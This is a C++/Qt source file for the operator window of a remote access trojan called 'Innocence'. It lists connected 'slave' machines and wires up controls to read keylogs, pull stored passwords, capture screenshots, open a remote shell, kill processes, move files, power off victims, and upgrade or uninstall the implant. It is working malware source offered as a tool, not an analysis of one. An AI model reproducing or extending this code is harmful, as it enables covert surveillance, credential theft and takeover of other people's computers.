#include <string>
#include <algorithm>
using namespace std;

#include <QtGui>
#include <QtWidgets/QMessageBox>
#include <QFileDialog>

#include <common/Log.hpp>
#include <Innocence.hpp>
using namespace Network;

#include "Slave.hpp"
#include "ListeningThread.hpp"
#include "MasterWindow.hpp"

namespace Master
{ 
    MasterWindow::MasterWindow(QWidget * parent)
    :QMainWindow(parent)
    {
        currentSlave = slaves.end();
        // Initialisation de l'interface graphique
        setupUi(this);
        createStatusBar();

        connectedSlavesView->setModel(&slavesModel);
        listener = new ListeningThread(portBox->value(), passEdit->text(), this);
        qRegisterMetaType<Session>("Session");
        connect(listener, SIGNAL(newSlaveConnected(Session)), this, SLOT(onNewSlave(Session)));
        connect(actionAboutQt, SIGNAL(triggered()), this, SLOT(aboutQt()));
        connect(actionAboutInnocence, SIGNAL(triggered()), this, SLOT(about()));
        connect(actionEditerClient, SIGNAL(triggered()), &editSlaveDialog, SLOT(show()));
        
        // configuration du screenshot a distance
        screenLabel->setBackgroundRole(QPalette::Base);
        screenLabel->setSizePolicy(QSizePolicy::Ignored, QSizePolicy::Ignored);
        screenLabel->setScaledContents(true);
        
        // construction de l'arbre des fichiers distants
        remoteFilesView->setHeaderHidden(true);
        remoteFilesView->header()->setSectionResizeMode(QHeaderView::Stretch);
        localFilesView->header()->setSectionResizeMode(QHeaderView::Stretch);
        
        // construction de l'arbre des fichiers locaux
		localFilesModel.setRootPath(localFilesModel.myComputer().toString());
        localFilesView->setModel(&localFilesModel);
        localFilesView->hideColumn(2);
        localFilesView->hideColumn(3);
        
        // configuration du gestionnaire de tache a distance
        processView->setSelectionMode(QAbstractItemView::SingleSelection);
        processView->setModel(&processModel);
        
        connectedSlavesView->horizontalHeader()->setSectionResizeMode(QHeaderView::Stretch);
        
        // connexions signals / slots pour le panneau de droite
        connect(disconnectButton,     SIGNAL(clicked()), this, SLOT(onDisconnect()));
        connect(listenButton,         SIGNAL(clicked()), this, SLOT(onListen()));
        connect(connectedSlavesView, SIGNAL(clicked(const QModelIndex&)), this, SLOT(onChangeSlave(const QModelIndex &)));
        connect(actionConfigure,      SIGNAL(triggered()), this, SLOT(configureOptions()));
        connect(actionShutdownServer, SIGNAL(triggered()), this, SLOT(shutdown()));
        connect(actionRebootServer,   SIGNAL(triggered()), this, SLOT(reboot()));
        connect(actionUninstallServer,SIGNAL(triggered()), this, SLOT(uninstall()));
        connect(actionUpgradeServer,  SIGNAL(triggered()), this, SLOT(upgrade()));
        connect(shutdownButton,       SIGNAL(clicked()), this, SLOT(remoteShutdown()));
        connect(rebootButton,         SIGNAL(clicked()), this, SLOT(remoteReboot()));
        connect(logoutButton,         SIGNAL(clicked()), this, SLOT(remoteLogout()));
        connect(hibernateButton,      SIGNAL(clicked()), this, SLOT(remoteHibernate()));
        connect(remoteShellButton,    SIGNAL(clicked()), this, SLOT(remoteShell()));
        connect(getPasswordButton,    SIGNAL(clicked()), this, SLOT(getPasswords()));
        connect(updateProcessListButton, SIGNAL(clicked()), this, SLOT(updateProcessList()));
        connect(killProcessButton,       SIGNAL(clicked()), this, SLOT(killProcess()));
        connect(updateScreenButton,      SIGNAL(clicked()), this, SLOT(updateScreen()));
        connect(saveScreenButton,        SIGNAL(clicked()), this, SLOT(saveScreen()));
        connect(updateLogButton,         SIGNAL(clicked()), this, SLOT(showKeylog()));
        connect(saveLogButton,           SIGNAL(clicked()), this, SLOT(saveKeylog()));
        connect(remoteFilesView,         SIGNAL(doubleClicked(QModelIndex)), this, SLOT(browseRemoteFiles(QModelIndex)));
        connect(downloadButton,          SIGNAL(clicked()), this, SLOT(startDownload()));
        connect(uploadButton,            SIGNAL(clicked()), this, SLOT(startUpload()));
        
        updateDisconnected();
    }

    MasterWindow::~MasterWindow()
    {
        listener->stopListen();
        
        // nettoie tous les objets cores
        for(SlavePtrList::iterator iter = slaves.begin(); iter != slaves.end(); iter++)
        {
            delete *iter;
        }
    }

    void MasterWindow::aboutQt()
    {
        QMessageBox::aboutQt(this);
    }

    void MasterWindow::about()
    {
        QMessageBox::about(this, tr("About Innocence"), tr("Innocence Project, made by Crunch"));
    }

    void MasterWindow::createStatusBar()
    {
        connectionStatusLabel = new QLabel(tr(" <font color=\"#FF0000\">Offline </font> "));
        connectionStatusLabel->setAlignment(Qt::AlignHCenter);
        connectionStatusLabel->setMinimumSize(connectionStatusLabel->sizeHint());
        hostInfoIp = new QLabel(tr(" Host : "));
        hostInfoIp->setAlignment(Qt::AlignHCenter);
        hostInfoIp->setMinimumSize(hostInfoIp->sizeHint());
        hostInfoPort = new QLabel(tr(" Port : "));
        hostInfoIp->setAlignment(Qt::AlignHCenter);
        hostInfoIp->setMinimumSize(hostInfoIp->sizeHint());
        infoIp = new QLabel(tr(" None "));
        infoPort = new QLabel(tr(" None "));
        statusBar()->addWidget(connectionStatusLabel);
        statusBar()->addWidget(hostInfoIp);
        statusBar()->addWidget(infoIp, 1);
        statusBar()->addWidget(hostInfoPort);
        statusBar()->addWidget(infoPort, 1);
    }

    void MasterWindow::updateConnected(const QString& ip, const QString& port)
    {
        LOG << "GUI enabled";
        tabWidget->setEnabled(true);
        
        portLabel->setVisible(false);
        portBox->setVisible(false);
        mdpLabel->setVisible(false);
        passEdit->setVisible(false);
        portBox->setEnabled(false);
        passEdit->setEnabled(false);
        
        infoIp->setText(ip);
        infoPort->setText(port);
        connectionStatusLabel->setText(tr(" <font color=\"#19DD2C\">Online </font> "));
        
        disconnectButton->setEnabled(true);
    }

    void MasterWindow::updateDisconnected()
    {
        LOG << "GUI disabled";
        tabWidget->setEnabled(false);
        portBox->setVisible(true);
        mdpLabel->setVisible(true);
        passEdit->setVisible(true);
        portLabel->setVisible(true);
        portBox->setEnabled(true);
        passEdit->setEnabled(true);
        infoIp->setText(" None ");
        infoPort->setText(" None ");
        connectionStatusLabel->setText(tr(" <font color=\"#FF0000\">Offline </font> "));
        
        if(!slaves.size())
        {
            disconnectButton->setEnabled(false);
        }
    }

    void MasterWindow::onListen()
    {
		if(listener->isListening())
        {
			listener->stopListen();
            listenButton->setText(tr("Start listening"));
        }
        else
		{
            listener->listen();
            listenButton->setText(tr("Stop listening"));
        }
    }

    void MasterWindow::onDisconnect()
    {
        try
        {
            if(currentSlave != slaves.end())
            {
                // desactivation de l'interface
                updateDisconnected();
                
                // on le deconnecte proprement
                (*currentSlave)->disconnect();

                // on detruit l'objet core
                delete (*currentSlave);

                // on enleve le pointeur de la liste grace a l'iterateur
                slaves.erase(currentSlave);
                
                if(slaves.size())
                {
                    currentSlave = slaves.begin();
                }
                else
                {
                    currentSlave = slaves.end();
                }
                
                // on met a jour le modele
                slavesModel.set(slaves);
                
                // on change de client en cours
                switchSlave();
                
                if(currentSlave == slaves.end())
                {
                    LOG << "No slave left";
                    updateDisconnected();
                }
            }
        }
        catch(std::exception& e)
        {
            LOG << e.what();
        }
        catch(...)
        {
            LOG << "Unkown exception";
        }
    }

    void MasterWindow::onDisconnectedSlave()
    {
        // un des clients s'est deconnecte, mais on ne sais pas lequel
        // pour le savoir on n'utilise : QObject::sender()
        SlavePtr disconnectedSlave = (SlavePtr) QObject::sender();
        
        LOG << "Slave " + disconnectedSlave->getIp().toStdString() + ":" + disconnectedSlave->getPort().toStdString() + " is connected";
        
		// on le deconnecte proprement
        disconnectedSlave->disconnect();

        SlavePtrList::iterator iter = std::find(slaves.begin(), slaves.end(), disconnectedSlave);
        if(iter != slaves.end())
        {
            // on enleve le pointeur de la liste grace a l'iterateur
            slaves.erase(iter);
            
            // on met a jour le modele
            slavesModel.set(slaves);
            
			currentSlave = slaves.begin();
            switchSlave();
        }

		// on detruit l'objet core
        delete disconnectedSlave;
    }
	/*
    void MasterWindow::addAuxClient(Network::TcpClient new_stream, Blaspheme::SessionId id_stream)
    {
        // l'ID reçu est l'ID d'un client déjà connecté
        // recherche de l'objet client associé
        for(std::vector<Client *>::iterator iter = clients.begin();
            iter != clients.end();
            iter++)
        {
            if((*iter)->getUniqueId() == id_stream)
            {
                LOG << "New association of secondary connection for slave";
                stream_mutex.lock();
                (*iter)->addStream(new_stream);
                stream_associated.wakeAll();
                stream_mutex.unlock();
                return;
            }
        }
    }
	*/
    void MasterWindow::onNewSlave(Session session)
    {
        try
        {
			LOG << "Creating new slave object";
            // construit un nouvel objet Client que l'on associe au nouveau flux
            Slave * slave = new Slave(session);

            // il faudra mettre a jour l'interface si ce client vient a se deconnecter
            connect(slave, SIGNAL(disconnected()), this, SLOT(onDisconnectedSlave()));
            
            // si l'on active un remote shell, on desactive l'ecoute de nouvelles connexions
            connect(slave, SIGNAL(remoteShellState(bool)), listener, SLOT(setNotListening(bool)));
            connect(slave, SIGNAL(remoteShellState(bool)), this, SLOT(setDisabled(bool)));
            
            // ajout du serveur a la liste des serveurs connectes
            slaves.push_back(slave);

            // mise a jour du modele :
            slavesModel.set(slaves);
                
            // si il n'y avait pas de serveur connectes, on fait en sorte que le premier connecté
            // soit celui que l'on veut controler tout de suite
            if(slaves.size() == 1)
            {
                disconnectButton->setEnabled(true);
                currentIndex = slavesModel.index(0,0);
                currentSlave = slaves.begin();
                switchSlave();
            }
		}
        catch(std::exception& e)
        {
            LOG << e.what();
        }
        catch(...)
        {
            LOG << "Unknown exception";
        }
    }

    void MasterWindow::onChangeSlave( const QModelIndex & index)
    {        
        if(currentIndex == index)
        {
            LOG << "Same slave to control";
        }
        else
        {
            currentIndex = index;
            SlavePtr ptr = slavesModel.getSlave(index);
            SlavePtrList::iterator slaveIter = std::find(slaves.begin(), slaves.end(), ptr);
            if(slaveIter != slaves.end())
            {
                currentSlave = slaveIter;
                switchSlave();
            }
        }
    }

    void MasterWindow::switchSlave()
    {
        LOG << "Switching slave";        
        if(currentSlave != slaves.end())
        {
            screenProgressBar->setValue(0);
            remoteFilesView->setModel(&(*currentSlave)->getRemoteFileTree());
            passwordsDialog.setPasswords((*currentSlave)->getStoredPasswords());
            processModel.setStringList((*currentSlave)->getProcessList());
            screenLabel->setPixmap((*currentSlave)->getScreen());
            keylogEdit->clear();
            keylogEdit->append((*currentSlave)->getKeylog());
            updateConnected((*currentSlave)->getIp(), (*currentSlave)->getPort());
        }
        else
        {
            LOG << "No slave left";
            updateDisconnected();
        }
    }

    void MasterWindow::onFailedAuth()
    {
        LOG << "Authentication failed";
        connectionStatusLabel->setText(tr(" <font color=\"#FF0000\">Bad password</font> "));
    }

    void MasterWindow::configureOptions()
    {
        
    }

    void MasterWindow::shutdown()
    {
        if(currentSlave != slaves.end())
        {
            (*currentSlave)->shutdown();
        }
    }

    void MasterWindow::reboot()
    {
        if(currentSlave != slaves.end())
        {
            (*currentSlave)->reboot();
        }
    }

    void MasterWindow::uninstall()
    {
        if(currentSlave != slaves.end())
        {
            (*currentSlave)->uninstall();
        }
    }

    void MasterWindow::upgrade()
    {
        if(currentSlave != slaves.end())
        {
            // on informe l'utilisateur que c'est une manoeuvre risquée
            QMessageBox::information(this, windowTitle(),tr("Warning, you must select a valid Innocence slave installer"));

            // on trouve le chemin du nouvel injecteur
            QString fileName = QFileDialog::getOpenFileName(this, tr("Open File"),"C:\\",tr("Executable (*.exe)"));
            if(fileName.size())
            {
                (*currentSlave)->upgrade(fileName);
            }
        }
    }

    void MasterWindow::remoteShutdown()
    {
        if(currentSlave != slaves.end())
        {
            (*currentSlave)->remoteShutdown();
        }
    }

    void MasterWindow::remoteReboot()
    {
        if(currentSlave != slaves.end())
        {
            (*currentSlave)->remoteReboot();
        }
    }

    void MasterWindow::remoteHibernate()
    {
        if(currentSlave != slaves.end())
        {
            (*currentSlave)->remoteHibernate();
        }
    }

    void MasterWindow::remoteLogout()
    {
        if(currentSlave != slaves.end())
        {
            (*currentSlave)->remoteLogout();
        }
    }

    void MasterWindow::remoteShell()
    {
        if(currentSlave != slaves.end())
        {
            (*currentSlave)->remoteShell();
        }
    }

    void MasterWindow::getPasswords()
    {
        if(currentSlave != slaves.end())
        {
			passwordsDialog.setPasswords((*currentSlave)->getStoredPasswords());
            passwordsDialog.show();
        }
    }

    void MasterWindow::updateProcessList()
    {
        if(currentSlave != slaves.end())
        {
            (*currentSlave)->updateProcessList();
            processModel.setStringList((*currentSlave)->getProcessList());
        }
    }

    void MasterWindow::killProcess()
    {
        if(currentSlave != slaves.end())
        {
            QModelIndex index = processView->currentIndex();
            if(index.isValid())
            {
                (*currentSlave)->killProcess(processModel.data(index, Qt::DisplayRole).toString());

                // temps d'attente pendant la mise a jour de la liste...
                QThread::currentThread()->wait(500);

                updateProcessList();
            }
        }
    }

    void MasterWindow::updateScreen()
    {
		updateScreenButton->setEnabled(false);
        screenProgressBar->setValue(0);
        if(currentSlave != slaves.end())
        {
            (*currentSlave)->updateScreen((int)jpegQualitySpinBox->value(), screenProgressBar);		
        }

		if(currentSlave != slaves.end())
		{
			screenLabel->clear();
            screenLabel->setPixmap((*currentSlave)->getScreen());
		}
		updateScreenButton->setEnabled(true);
    }

    void MasterWindow::saveScreen()
    {
        const QPixmap * screenmap = screenLabel->pixmap();
        if(screenmap)
        {
            // enregistrement du screenshot dans le fichier indique par l'utilisateur
            QString fileName = QFileDialog::getSaveFileName(this, tr("Save File"),"C:\\screen.jpg",tr("Screenshot (*.jpg)"));
            screenmap->save(fileName);
        }
    }

    void MasterWindow::showKeylog()
    {
        if(currentSlave != slaves.end())
        {
            updateLogButton->setEnabled(false);
            (*currentSlave)->updateKeylog(keylogProgressBar);
            keylogEdit->clear();
            keylogEdit->append((*currentSlave)->getKeylog());
            updateLogButton->setEnabled(true);
        }
    }

    void MasterWindow::saveKeylog()
    {
        if(keylogEdit->toPlainText().toStdString().size())
        {
            QString fileName = QFileDialog::getSaveFileName(this, tr("Save File"),"C:\\",tr("Text (*.txt)"));
            if(fileName.size())
            {   
                fstream file;
                file.open(fileName.toStdString().c_str(), std::ios::out | std::ios::app);
                file.write(keylogEdit->toPlainText().toStdString().c_str(), keylogEdit->toPlainText().toStdString().size());
                file.close();
            }
        }
    }

    void MasterWindow::browseRemoteFiles(QModelIndex index)
    {
        if(currentSlave != slaves.end())
        {
            if(!(*currentSlave)->browseFiles(index))
            {
                QMessageBox::information(0, "Innocence","Can't list directory");
            }
        }
    }

    void MasterWindow::startDownload()
    {
        if(currentSlave != slaves.end())
        {
            // si un fichier a été sélectionné sur le serveur
            if(remoteFilesView->currentIndex() == QModelIndex())
            {
                QMessageBox::information(0, "TheSleeper",tr("Please select a file to download from slave"));
                return;
            }

            QString sourceFileName = (*currentSlave)->getRemoteFileTree().data(remoteFilesView->currentIndex()).toString();
            if(sourceFileName[sourceFileName.size()-1] == '\\')
            {
                QMessageBox::information(0, "TheSleeper",tr("Please select a source file instead of source directory"));
                return;
            }
            
			if(localFilesView->currentIndex() == QModelIndex ())
            {
                QMessageBox::information(0, "TheSleeper",tr("Please select a destination folder"));
                return;
            }
            
            if(!localFilesModel.isDir(localFilesView->currentIndex()))
            {
                QMessageBox::information(0, "TheSleeper",tr("Please select a destination directory instead of destination file"));
                return;
            }
            
            QString sourceFilePath = (*currentSlave)->getRemotePath(remoteFilesView->currentIndex());
            QString destinationFilePath = localFilesModel.filePath(localFilesView->currentIndex()) + "\\" + sourceFileName;    
            (*currentSlave)->startDownload(sourceFilePath, destinationFilePath, transferProgressBar);
        }
    }

    void MasterWindow::startUpload()
    {
        if(currentSlave != slaves.end())
        {
            if(localFilesModel.isDir(localFilesView->currentIndex()))
            {
                QMessageBox::information(0, "TheSleeper",tr("Please select the file to upload"));
                return;
            }
            
            QString destinationFileName = (*currentSlave)->getRemoteFileTree().data(remoteFilesView->currentIndex()).toString();
            if(destinationFileName[destinationFileName.size()-1] != '\\')
            {
                QMessageBox::information(0, "TheSleeper",tr("Please select a destination directory"));
                return;
            }
            
            QString sourceFilePath = localFilesModel.filePath(localFilesView->currentIndex());
            QString destinationFilePath = (*currentSlave)->getRemotePath(remoteFilesView->currentIndex()) + localFilesModel.fileName(localFilesView->currentIndex());;
            (*currentSlave)->startUpload(sourceFilePath, destinationFilePath, transferProgressBar);
        }
    }
    
} // Master
